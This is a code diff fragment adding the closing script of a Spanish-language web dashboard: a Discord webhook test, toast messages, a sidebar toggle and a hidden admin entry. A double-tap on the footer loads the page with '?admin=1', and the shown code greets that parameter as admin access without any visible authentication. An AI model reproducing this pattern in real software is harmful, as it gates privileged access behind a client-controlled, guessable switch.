+            content: '🧪 **Prueba de webhook**\nServidor: ' + window.location.hostname + '\nHora: ' + new Date().toISOString(),
+          }),
+        });
+        if (res.ok) {
+          showToast('✅ Prueba enviada correctamente', 'success');
+        } else {
+          showToast('❌ Error: ' + res.status, 'error');
+        }
+      } catch (e) {
+        showToast('❌ Error de conexión: ' + e.message, 'error');
+      }
+    }
+
+    function restoreDefaultTemplate() {
+      document.getElementById('setting_discordMessageTemplate').value = '';
+      showToast('Plantilla restaurada (default)', 'success');
+    }
+
+    // ===================== TOAST =====================
+    function showToast(message, type = 'success') {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = 'toast ' + type + ' show';
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // ===================== SIDEBAR TOGGLE =====================
+    function toggleSidebar() {
+      document.getElementById('sidebar').classList.toggle('open');
+      document.getElementById('sidebarOverlay').classList.toggle('open');
+    }
+
+    // ===================== FOOTER DOUBLE-TAP =====================
+    function onFooterTap(e) {
+      const now = Date.now();
+      if (now - footerLastTapTime < 400) {
+        // Double tap detected
+        footerTapCount++;
+        if (footerTapCount >= 2) {
+          // Trigger admin access
+          window.location.href = 'dashboard.html?admin=1';
+          footerTapCount = 0;
+          return;
+        }
+      } else {
+        footerTapCount = 1;
+      }
+      footerLastTapTime = now;
+
+      // Also handle if clicked on the footer text
+      if (e.target.tagName === 'A' || e.target.tagName === 'SPAN') {
+        // Don't navigate, just track taps
+        e.preventDefault();
+      }
+    }
+
+    // ===================== CHECK ADMIN ACCESS =====================
+    (function checkAdminAccess() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const adminParam = urlParams.get('admin');
+      if (adminParam === '1') {
+        // Already accessed via double tap, just show the dashboard
+        showToast('Bienvenido al panel de administración', 'success');
+      }
+      init();
+    })();
+  </script>
+</body>
+</html>
